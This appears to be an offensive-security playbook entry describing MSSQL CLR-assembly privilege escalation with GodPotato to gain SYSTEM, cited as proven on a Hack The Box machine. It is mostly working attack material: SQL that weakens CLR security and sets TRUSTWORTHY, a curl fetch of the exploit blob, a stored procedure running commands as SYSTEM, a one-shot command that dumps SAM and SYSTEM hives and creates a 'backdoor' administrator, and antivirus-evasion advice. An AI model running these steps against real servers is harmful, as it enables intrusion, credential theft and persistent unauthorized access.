# MSSQL CLR Assembly Privesc via GodPotato

## When to use

- MSSQL sysadmin access (e.g. via SQL injection with `sa` or `EXECUTE AS LOGIN`)
- Target has `SeImpersonatePrivilege` (default for MSSQL service accounts)
- Defender or other AV is blocking binary uploads to disk
- Goal: execute commands as NT AUTHORITY\SYSTEM

## Tags

- ATT&CK: T1068 (Exploitation for Privilege Escalation), T1078.003 (Valid Accounts: Local Accounts)
- Platform: Windows (Server 2019, 2022, 2025 confirmed)
- Services: MSSQL
- Privileges: SeImpersonatePrivilege, sysadmin role

## How it works

GodPotato abuses the DCOM activation service to impersonate SYSTEM from a
SeImpersonate context. Loading it as a CLR assembly means the .NET DLL lives
entirely in SQL Server memory; no file touches disk, so file-based AV never
scans it.

## Prerequisites

Enable CLR execution and mark the database as trusted:

```sql
-- Enable CLR
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;

-- Disable strict security (SQL Server 2017+)
EXEC sp_configure 'clr strict security', 0; RECONFIGURE;

-- Mark database as trusted for UNSAFE assemblies
ALTER DATABASE master SET TRUSTWORTHY ON;
```

## Loading the assembly

The hex blob comes from `cyndicatelabs/GodPotato_CLR` on GitHub
(`MSSQL_Commands.txt` contains the full `CREATE ASSEMBLY` statement with the
pre-compiled .NET DLL encoded as `0x4D5A...`). The blob is ~111K characters.

Fetch it at runtime rather than embedding it in the knowledge base:

```bash
# Download the commands file
curl -sL https://raw.githubusercontent.com/cyndicatelabs/GodPotato_CLR/main/MSSQL_Commands.txt -o /tmp/godpotato-clr.txt

# Extract just the CREATE ASSEMBLY line
grep 'CREATE ASSEMBLY' /tmp/godpotato-clr.txt
```

Then execute the hex blob via your SQL channel:

```sql
CREATE ASSEMBLY my_assembly FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE;
```

## Creating the stored procedure

```sql
CREATE PROCEDURE [dbo].[cmd_exec]
  @execCommand NVARCHAR(4000)
AS EXTERNAL NAME [my_assembly].[GodPotato.StoredProcedures].[cmd_exec];
```

## Executing commands as SYSTEM

```sql
EXEC dbo.cmd_exec 'cmd /c whoami';
```

## Operational notes

**DCOM activation is single-use.** GodPotato's DCOM activation fires once per
MSSQL process lifetime. After the first `cmd_exec` call completes, subsequent
calls will fail to impersonate SYSTEM. Combine all SYSTEM commands into one
call using `&` chaining:

```sql
-- Read flags, dump SAM, create admin user in one shot
EXEC dbo.cmd_exec 'cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\loot.txt & reg save HKLM\SAM C:\Users\Public\sam.hiv & reg save HKLM\SYSTEM C:\Users\Public\system.hiv & net user backdoor P@ssw0rd123 /add & net localgroup Administrators backdoor /add';
```

If the MSSQL service restarts (crash, reboot), the DCOM activation resets and
you can fire `cmd_exec` again. The assembly persists across restarts as long as
the database is intact.

## Cleanup

```sql
DROP PROCEDURE IF EXISTS dbo.cmd_exec;
DROP ASSEMBLY IF EXISTS my_assembly;
```

## Fallback paths

If CLR is blocked (policy, permissions, older SQL Server without CLR support):

1. **OLE Automation:** `sp_OACreate 'WScript.Shell'` + `sp_OAMethod` (requires
   `Ole Automation Procedures` enabled via `sp_configure`)
2. **xp_cmdshell:** `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;` then
   `EXEC xp_cmdshell 'command'` (runs as MSSQL service account, not SYSTEM)

## Proven on

HTB Odyssey (2026-07-06): Windows Server 2025 Datacenter with Defender active.
PrintSpoofer, Go reverse shell, Go+donut shellcode loader all blocked by
real-time protection. CLR hex blob was the only working privilege escalation
path.
